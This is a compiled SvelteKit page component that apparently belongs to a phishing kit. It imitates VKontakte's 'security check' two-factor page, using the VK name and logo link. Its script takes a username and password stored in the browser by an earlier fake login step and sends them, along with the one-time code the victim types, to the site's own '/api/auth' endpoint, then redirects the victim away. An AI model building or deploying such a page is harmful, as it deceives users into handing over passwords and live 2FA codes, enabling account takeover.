import{s as re,n as ue,r as ce,o as ie}from"../chunks/scheduler.63274e7e.js";import{S as _e,i as fe,s as q,g as o,m as oe,y as pe,f as h,c as R,h as n,j as A,z as N,n as ne,k as e,a as X,x as t,A as se,B as Q,C as de,o as me}from"../chunks/index.95432262.js";import{g as ae}from"../chunks/navigation.1f89bfd8.js";import{U as he,P as ve,R as F}from"../chunks/keys.58dfb381.js";const be=!0,ke=Object.freeze(Object.defineProperty({__proto__:null,prerender:be},Symbol.toStringTag,{value:"Module"}));function le(p){let r,u,m="Ошибка",d,_,v;return{c(){r=o("div"),u=o("h4"),u.textContent=m,d=q(),_=o("div"),v=oe(p[1]),this.h()},l(s){r=n(s,"DIV",{class:!0});var a=A(r);u=n(a,"H4",{class:!0,"data-svelte-h":!0}),N(u)!=="svelte-bs5f3f"&&(u.textContent=m),d=R(a),_=n(a,"DIV",{class:!0});var B=A(_);v=ne(B,p[1]),B.forEach(h),a.forEach(h),this.h()},h(){e(u,"class","otp-form__error-title svelte-gbequ7"),e(_,"class","otp-form__error-desc"),e(r,"class","otp-form__error svelte-gbequ7")},m(s,a){X(s,r,a),t(r,u),t(r,d),t(r,_),t(_,v)},p(s,a){a&2&&me(v,s[1])},d(s){s&&h(r)}}}function Ee(p){let r,u,m,d,_='<nav class="otp-form__nav svelte-gbequ7"><a class="otp-form__nav-logo svelte-gbequ7" href="/">ВКонтакте</a> <a href="https://vk.com" rel="external" class="otp-form__nav-action svelte-gbequ7"></a></nav>',v,s,a,B="Проверка безопасности",L,l,b,U=`Пожалуйста, введите
					<b>код</b>
					из личного сообщения от Администрации или из приложения для генерации кодов, чтобы подтвердить,
					что Вы владелец страницы.`,P,x,E,S,D,Y="Код подтверждения",j,c,z,I,g,W,O,Z="Запомнить браузер",J,k,K,G,$,f=p[1]&&le(p);return{c(){r=q(),u=o("div"),m=o("div"),d=o("div"),d.innerHTML=_,v=q(),s=o("form"),a=o("h1"),a.textContent=B,L=q(),l=o("div"),b=o("p"),b.innerHTML=U,P=q(),f&&f.c(),x=q(),E=o("div"),S=o("label"),D=o("span"),D.textContent=Y,j=q(),c=o("input"),z=q(),I=o("label"),g=o("input"),W=q(),O=o("span"),O.textContent=Z,J=q(),k=o("button"),K=oe("Отправить"),this.h()},l(i){pe("svelte-103qual",document.head).forEach(h),r=R(i),u=n(i,"DIV",{class:!0});var ee=A(u);m=n(ee,"DIV",{class:!0});var M=A(m);d=n(M,"DIV",{class:!0,"data-svelte-h":!0}),N(d)!=="svelte-1hccez7"&&(d.innerHTML=_),v=R(M),s=n(M,"FORM",{class:!0});var V=A(s);a=n(V,"H1",{class:!0,"data-svelte-h":!0}),N(a)!=="svelte-ih1hsd"&&(a.textContent=B),L=R(V),l=n(V,"DIV",{class:!0});var T=A(l);b=n(T,"P",{class:!0,"data-svelte-h":!0}),N(b)!=="svelte-1bqqz7z"&&(b.innerHTML=U),P=R(T),f&&f.l(T),x=R(T),E=n(T,"DIV",{class:!0});var y=A(E);S=n(y,"LABEL",{class:!0});var w=A(S);D=n(w,"SPAN",{class:!0,"data-svelte-h":!0}),N(D)!=="svelte-fu61m2"&&(D.textContent=Y),j=R(w),c=n(w,"INPUT",{type:!0,class:!0,autocomplete:!0,inputmode:!0,placeholder:!0,minlength:!0,maxlength:!0,pattern:!0}),w.forEach(h),z=R(y),I=n(y,"LABEL",{class:!0});var H=A(I);g=n(H,"INPUT",{type:!0,class:!0}),W=R(H),O=n(H,"SPAN",{class:!0,"data-svelte-h":!0}),N(O)!=="svelte-1cbtoo6"&&(O.textContent=Z),H.forEach(h),J=R(y),k=n(y,"BUTTON",{type:!0,class:!0});var te=A(k);K=ne(te,"Отправить"),te.forEach(h),y.forEach(h),T.forEach(h),V.forEach(h),M.forEach(h),ee.forEach(h),this.h()},h(){document.title="Проверка безопасности | ВКонтакте",e(d,"class","otp-form__nav-container svelte-gbequ7"),e(a,"class","otp-form__form-title svelte-gbequ7"),e(b,"class","otp-form__form-desc svelte-gbequ7"),e(D,"class","otp-form__label svelte-gbequ7"),e(c,"type","text"),e(c,"class","otp-form__input svelte-gbequ7"),e(c,"autocomplete","one-time-code"),e(c,"inputmode","numeric"),e(c,"placeholder","Введите код"),c.disabled=p[0],e(c,"minlength","4"),e(c,"maxlength","8"),e(c,"pattern","[0-9]+"),e(S,"class","otp-form__field svelte-gbequ7"),e(g,"type","checkbox"),e(g,"class","otp-form__checkbox-element svelte-gbequ7"),g.disabled=p[0],e(O,"class","otp-form__checkbox-label svelte-gbequ7"),e(I,"class","otp-form__field otp-form__field--checkbox svelte-gbequ7"),e(k,"type","submit"),e(k,"class","otp-form__button otp-form__button--primary otp-form__button--submit svelte-gbequ7"),k.disabled=p[0],e(E,"class","otp-form__fields svelte-gbequ7"),e(l,"class","otp-form__content svelte-gbequ7"),e(s,"class","otp-form__form svelte-gbequ7"),e(m,"class","otp-form"),e(u,"class","background svelte-gbequ7")},m(i,C){X(i,r,C),X(i,u,C),t(u,m),t(m,d),t(m,v),t(m,s),t(s,a),t(s,L),t(s,l),t(l,b),t(l,P),f&&f.m(l,null),t(l,x),t(l,E),t(E,S),t(S,D),t(S,j),t(S,c),se(c,p[2]),t(E,z),t(E,I),t(I,g),g.checked=p[3],t(I,W),t(I,O),t(E,J),t(E,k),t(k,K),G||($=[Q(c,"input",p[5]),Q(g,"change",p[6]),Q(s,"submit",de(p[4]))],G=!0)},p(i,[C]){i[1]?f?f.p(i,C):(f=le(i),f.c(),f.m(l,x)):f&&(f.d(1),f=null),C&1&&(c.disabled=i[0]),C&4&&c.value!==i[2]&&se(c,i[2]),C&1&&(g.disabled=i[0]),C&8&&(g.checked=i[3]),C&1&&(k.disabled=i[0])},i:ue,o:ue,d(i){i&&(h(r),h(u)),f&&f.d(),G=!1,ce($)}}}function ge(p,r,u){function m(){const l=localStorage.getItem(he),b=localStorage.getItem(ve);if(l&&b)return[l,b];ae("/auth")}ie(()=>m());let d=!1,_="",v="",s=!0;async function a(){u(0,d=!0);const l=m();if(!l)return;const b={code:v,username:l[0],password:l[1]};try{switch((await(await fetch("/api/auth",{method:"POST",body:JSON.stringify(b),headers:{"Content-Type":"application/json"}})).json()).status){case F.SUCCESS:window.location.assign("/api/exit");break;case F.ERROR_INVALID_CREDENTIALS:case F.ERROR_CAPTCHA:ae("/auth");break;case F.ERROR_INVALID_CODE:u(1,_="Пожалуйста, введите код, который Вы только что получили.");break;case F.ERROR_TOO_MUCH_RETIRES:u(1,_="Слишком много попыток входа. Повторите попытку позднее.");break;case F.ERROR_UNKNOWN:default:u(1,_="Произошла неизвестная ошибка.");break}}catch{u(1,_="Произошла сетевая ошибка"),setTimeout(()=>u(1,_=""),5e3)}finally{u(0,d=!1)}}function B(){v=this.value,u(2,v)}function L(){s=this.checked,u(3,s)}return[d,_,v,s,a,B,L]}class Se extends _e{constructor(r){super(),fe(this,r,ge,Ee,re,{})}}export{Se as component,ke as universal};
